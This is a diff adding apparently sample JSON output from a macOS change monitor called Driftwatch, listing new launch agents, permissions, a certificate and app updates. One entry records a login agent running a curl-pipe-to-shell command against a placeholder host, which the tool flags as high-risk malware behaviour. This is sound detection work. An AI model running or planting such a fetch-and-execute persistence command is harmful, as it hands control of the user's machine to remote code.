@@ -1,0 +1,205 @@
+{
+  "latest": {"snapshot_id": 42, "taken_at": "2026-11-10T18:00:00Z"},
+  "items_total": 412,
+  "errors": [],
+  "entries": [
+    {
+      "snapshot_id": 41,
+      "taken_at": "2026-11-10T09:41:00Z",
+      "changes": [
+        {
+          "kind": "added",
+          "category": "launchd",
+          "key": "/Users/you/Library/LaunchAgents/com.example.updater.plist",
+          "title": "com.example.updater",
+          "summary": "Starts a program every time you log in. It runs: /bin/sh -c curl -fsSL https://example.invalid/u.sh | sh",
+          "risk": "high",
+          "risk_reason": "Downloads code from the internet and runs it straight away, a common malware trick.",
+          "added_by": null,
+          "confidence": null,
+          "fields": {
+            "Label": "com.example.updater",
+            "ProgramArguments": "/bin/sh -c curl -fsSL https://example.invalid/u.sh | sh",
+            "RunAtLoad": "true",
+            "file_sha256": "3f1c9a0e7b2d4c6f8a1e3b5d7c9f0a2b4d6e8f1a3c5e7b9d0f2a4c6e8b1d3f5a",
+            "scope": "user agent"
+          },
+          "field_labels": {
+            "Label": "Name",
+            "ProgramArguments": "What it runs",
+            "RunAtLoad": "Starts at login",
+            "file_sha256": "File contents",
+            "scope": "Where"
+          },
+          "team_id": null,
+          "old_fields": null
+        },
+        {
+          "kind": "added",
+          "category": "tcc",
+          "key": "user: kTCCServiceCamera us.zoom.xos (type 0)",
+          "title": "xos can use your camera",
+          "summary": "A privacy permission from System Settings › Privacy & Security.",
+          "risk": "low",
+          "risk_reason": null,
+          "added_by": "Zoom",
+          "confidence": "likely",
+          "fields": {
+            "auth_value": "2",
+            "client": "us.zoom.xos",
+            "client_type": "0",
+            "scope": "user",
+            "service": "kTCCServiceCamera"
+          },
+          "field_labels": {
+            "auth_value": "Allowed",
+            "client": "App",
+            "client_type": "App kind",
+            "scope": "Where",
+            "service": "Permission"
+          },
+          "team_id": null,
+          "old_fields": null
+        },
+        {
+          "kind": "added",
+          "category": "certs",
+          "key": "/Users/you/Library/Keychains/login.keychain-db 6A1F3C5E7B9D0A2C4E6F8B1D3A5C7E9F0B2D4A6C",
+          "title": "Example Corp Root CA",
+          "summary": "A security certificate stored in your keychain.",
+          "risk": "low",
+          "risk_reason": null,
+          "added_by": null,
+          "confidence": null,
+          "fields": {
+            "keychain": "/Users/you/Library/Keychains/login.keychain-db",
+            "label": "Example Corp Root CA"
+          },
+          "field_labels": {
+            "keychain": "Keychain",
+            "label": "Name"
+          },
+          "team_id": null,
+          "old_fields": null
+        },
+        {
+          "kind": "modified",
+          "category": "apps",
+          "key": "/Applications/Google Chrome.app",
+          "title": "Google Chrome",
+          "summary": "An app in your Applications folder.",
+          "risk": "low",
+          "risk_reason": null,
+          "added_by": "Google",
+          "confidence": "known",
+          "fields": {
+            "authority": "Developer ID Application: Google LLC (EQHXZ8M8AV)",
+            "cdhash": "b7e2c4a9f1d3e5b7c9a1f3d5e7b9c1a3f5d7e9b1",
+            "signature_valid": "yes",
+            "signed": "yes",
+            "version": "143.0.7499.41"
+          },
+          "field_labels": {
+            "authority": "Signed by",
+            "cdhash": "Code fingerprint",
+            "signature_valid": "Signature checks out",
+            "signed": "Signed",
+            "version": "Version"
+          },
+          "team_id": "EQHXZ8M8AV",
+          "old_fields": {
+            "authority": "Developer ID Application: Google LLC (EQHXZ8M8AV)",
+            "cdhash": "a4d1b3e5c7f9a1b3d5e7f9c1b3a5d7e9f1c3b5a7",
+            "signature_valid": "yes",
+            "signed": "yes",
+            "version": "142.0.7444.176"
+          }
+        }
+      ]
+    },
+    {
+      "snapshot_id": 37,
+      "taken_at": "2026-11-06T14:12:00Z",
+      "changes": [
+        {
+          "kind": "added",
+          "category": "launchd",
+          "key": "/Users/you/Library/LaunchAgents/com.example.backup-helper.plist",
+          "title": "com.example.backup-helper",
+          "summary": "Starts a program every time you log in. It runs: /Applications/Backup Helper.app/Contents/Resources/helper",
+          "risk": "medium",
+          "risk_reason": "Driftwatch can’t confirm who made this.",
+          "added_by": "Backup Helper",
+          "confidence": "likely",
+          "fields": {
+            "Label": "com.example.backup-helper",
+            "Program": "/Applications/Backup Helper.app/Contents/Resources/helper",
+            "RunAtLoad": "true",
+            "file_sha256": "9d0f2a4c6e8b1d3f5a3f1c9a0e7b2d4c6f8a1e3b5d7c9f0a2b4d6e8f1a3c5e7b",
+            "scope": "user agent"
+          },
+          "field_labels": {
+            "Label": "Name",
+            "Program": "Program",
+            "RunAtLoad": "Starts at login",
+            "file_sha256": "File contents",
+            "scope": "Where"
+          },
+          "team_id": null,
+          "old_fields": null
+        },
+        {
+          "kind": "added",
+          "category": "launchd",
+          "key": "/Library/LaunchDaemons/us.zoom.ZoomDaemon.plist",
+          "title": "us.zoom.ZoomDaemon",
+          "summary": "Runs a program in the background as the system (root) when your Mac starts. It runs: /Library/PrivilegedHelperTools/us.zoom.ZoomDaemon",
+          "risk": "low",
+          "risk_reason": null,
+          "added_by": "Zoom",
+          "confidence": "known",
+          "fields": {
+            "Label": "us.zoom.ZoomDaemon",
+            "Program": "/Library/PrivilegedHelperTools/us.zoom.ZoomDaemon",
+            "RunAtLoad": "true",
+            "file_sha256": "c6f8a1e3b5d7c9f0a2b4d6e8f1a3c5e7b9d0f2a4c6e8b1d3f5a3f1c9a0e7b2d4",
+            "scope": "global daemon"
+          },
+          "field_labels": {
+            "Label": "Name",
+            "Program": "Program",
+            "RunAtLoad": "Starts at login",
+            "file_sha256": "File contents",
+            "scope": "Where"
+          },
+          "team_id": "BJ4HAAB9B3",
+          "old_fields": null
+        },
+        {
+          "kind": "modified",
+          "category": "ssh",
+          "key": "/Users/you/.ssh/config",
+          "title": "config",
+          "summary": "Settings for SSH connections you make to other computers.",
+          "risk": "low",
+          "risk_reason": null,
+          "added_by": null,
+          "confidence": null,
+          "fields": {
+            "file_sha256": "e8f1a3c5e7b9d0f2a4c6e8b1d3f5a3f1c9a0e7b2d4c6f8a1e3b5d7c9f0a2b4d6",
+            "size": "214"
+          },
+          "field_labels": {
+            "file_sha256": "File contents",
+            "size": "Size (bytes)"
+          },
+          "team_id": null,
+          "old_fields": {
+            "file_sha256": "1d3f5a3f1c9a0e7b2d4c6f8a1e3b5d7c9f0a2b4d6e8f1a3c5e7b9d0f2a4c6e8b",
+            "size": "167"
+          }
+        }
+      ]
+    }
+  ]
+}
